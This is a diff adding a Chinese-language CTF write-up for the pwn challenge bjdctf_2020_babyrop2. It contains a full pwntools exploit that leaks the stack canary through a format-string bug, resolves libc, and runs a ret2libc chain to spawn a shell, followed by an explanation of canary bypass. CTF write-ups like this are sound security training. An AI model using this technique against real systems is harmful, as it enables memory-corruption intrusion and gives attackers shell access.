@@ -680,4 +680,78 @@ mov     eax, 0
 
 **综上，可以很清楚的发现，直接往buf里面写入代码之后函数就会直接执行buf里的代码，所以直接注入shellcode就行**
 
-## 36
+## 36 bjdctf_2020_babyrop2
+
+格式化字符串+canary绕过+ret2libc
+
+我记得写过canary绕过的wp，忘了在哪了，再写一份吧
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',26391)
+def dbg():
+    gdb.attach(p)
+    pause()
+put_plt=elf.plt['puts']
+put_got=elf.got['puts']
+pop_rdi=0x0400993
+main_addr=elf.symbols['main']
+vuln_addr=0x400887
+
+p.sendlineafter('help u!\n',b'%7$p')
+p.recvuntil(b'0x')
+canary = int(p.recv(16),16)
+
+payload = p64(canary)
+payload = payload.rjust(0x20,b'a')+b'a'*8+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(vul
+n_addr)
+p.sendlineafter(b'story!\n',payload)
+put_addr=u64(p.recv(6).ljust(8,b'\x00'))
+
+libc=LibcSearcher('puts',put_addr)
+libcbase=put_addr-libc.dump("puts")
+system_addr=libcbase+libc.dump("system")
+binsh_addr=libcbase+libc.dump("str_bin_sh")
+
+payload = p64(canary)
+payload = payload.rjust(0x20,b'a')+b'a'*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+
+p64(vuln_addr)
+p.sendlineafter('story!\n',payload)
+p.interactive()
+```
+
+**审题**
+
+- `checksec`一下，发现开启了NX和canary
+
+- ida看一下，直接去`gift()`函数
+
+  - ![image-20250201232816600](./images/image-20250201232816600.png)
+
+  - v2就是canary值（一会后面解释canary保护），距离rbp为`0x-8`
+  - 这里还读入了format函数，格式化字符串试试，看看我们的第几个输入可以被解析为格式化字符
+  - 我是输入`aa%n$p`,一个个试过去，看看哪个对应出61，最后发现输入`aa%6$p`的时候输出为`aa0x702436256161`，说明：**第六个参数可以被解析成格式化字符串**
+  - 接下来动态调试一下看看canary的值是哪个（不出意外就是后一个）
+    - 在printf处下断点，然后run运行到断点处，输入aa，然后查看栈结构
+    - ![image-20250201233714092](./images/image-20250201233714092.png)
+    - canary值（v2)在rbp-8处，而我们输入的aa在它的上面，所以canary值可以用`%7$p`打印出来
+
+**canary保护**
+
+简单来说，就是程序在开始运行前从一块只读数据中读出来一个随机数存在栈底（rbp上面一个），然后返回的时候看看栈底这个数变了没，变了就说明被栈溢出了，程序中断。
+
+而想要绕过也很简单，只需要我们将canary的值读出来，在构造payload的时候放在它本来就该在的位置就好了
+
+```python
+payload = p64(canary)	# 写入canary值
+payload = payload.rjust(0x20,b'a')	# buf距离rbp为0x20，所以直接将canary和垃圾数据一起填满这32字节
+```
+
+*后面就是正常的ret2libc了，都写烂了要，不说了*
